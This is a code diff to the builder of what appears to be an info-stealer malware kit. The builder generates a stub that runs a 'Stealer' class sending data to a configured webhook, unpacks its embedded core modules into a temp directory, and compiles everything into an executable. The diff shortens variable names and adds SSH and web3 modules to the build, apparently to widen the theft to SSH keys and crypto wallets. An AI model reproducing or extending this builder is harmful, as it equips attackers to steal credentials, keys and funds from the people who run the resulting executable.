@@ -319,32 +319,30 @@ class Builder:
         self.compile_to_exe(stub_code)
 
     def generate_stub_code(self):
-        config_json = json.dumps(self.config).replace('true', 'True').replace('false', 'False').replace('null', 'None')
+        config_repr = repr(self.config)
         core_code = self.get_core_code()
         core_repr = repr(core_code)
         code = (
-            '# -*- coding: utf-8 -*-\n'
-            'import sys,json,os,base64,subprocess,tempfile\n\n'
-            'CONFIG = ' + config_json + '\n\n'
+            'import sys,os,json,base64,subprocess,tempfile\n\n'
+            'CONFIG = ' + config_repr + '\n\n'
             'def main():\n'
             '    try:\n'
             '        from core.stealer import Stealer\n'
             '        s = Stealer(CONFIG["webhook"], CONFIG)\n'
             '        s.run()\n'
             '    except ImportError:\n'
-            '        temp_dir = tempfile.mkdtemp()\n'
-            '        shiver_code = ' + core_repr + '\n'
-            '        for filepath, content in shiver_code.items():\n'
-            '            full_path = os.path.join(temp_dir, filepath)\n'
-            '            os.makedirs(os.path.dirname(full_path), exist_ok=True)\n'
-            '            with open(full_path, "w", encoding="utf-8") as f:\n'
-            '                f.write(content)\n'
-            '        sys.path.insert(0, temp_dir)\n'
+            '        td = tempfile.mkdtemp()\n'
+            '        sc = ' + core_repr + '\n'
+            '        for fp, ct in sc.items():\n'
+            '            p = os.path.join(td, fp)\n'
+            '            os.makedirs(os.path.dirname(p), exist_ok=True)\n'
+            '            with open(p, "w", encoding="utf-8") as f:\n'
+            '                f.write(ct)\n'
+            '        sys.path.insert(0, td)\n'
             '        from core.stealer import Stealer\n'
             '        s = Stealer(CONFIG["webhook"], CONFIG)\n'
             '        s.run()\n\n'
-            'if __name__ == "__main__":\n'
-            '    main()\n'
+            'main()\n'
         )
         return code
 
@@ -406,6 +404,8 @@ class Builder:
                 '--hidden-import', 'core.kiwi',
                 '--hidden-import', 'core.webhook',
                 '--hidden-import', 'core.stealer',
+                '--hidden-import', 'core.ssh',
+                '--hidden-import', 'core.web3',
                 stub_path
             ]
 
